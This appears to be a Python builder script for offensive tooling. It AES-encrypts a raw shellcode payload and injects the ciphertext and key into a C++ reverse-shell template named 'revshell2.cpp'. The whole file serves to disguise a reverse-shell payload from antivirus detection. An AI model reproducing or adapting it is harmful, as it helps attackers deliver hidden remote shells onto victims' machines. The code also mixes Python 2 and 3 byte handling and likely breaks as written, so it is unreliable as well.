import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))



try:  
    plaintext = open(sys.argv[1], "rb").read()
except:
    print(("File argument needed! %s <raw payload file>" % sys.argv[0]))
    sys.exit()



ciphertext = aesenc(plaintext, KEY)
key = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };'
payload = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'



f = open("code/revshell2.cpp", "r")

with open('code/revshell2.cpp', 'r') as file :
  filedata = file.read()

filedata = filedata.replace('payloadaes', payload)

with open('code/revshell2.cpp', 'w') as file:
  file.write(filedata)

f = open("code/revshell2.cpp", "r")

filedata = filedata.replace('KEYAES', key)

with open('code/revshell2.cpp', 'w') as file:
  file.write(filedata)
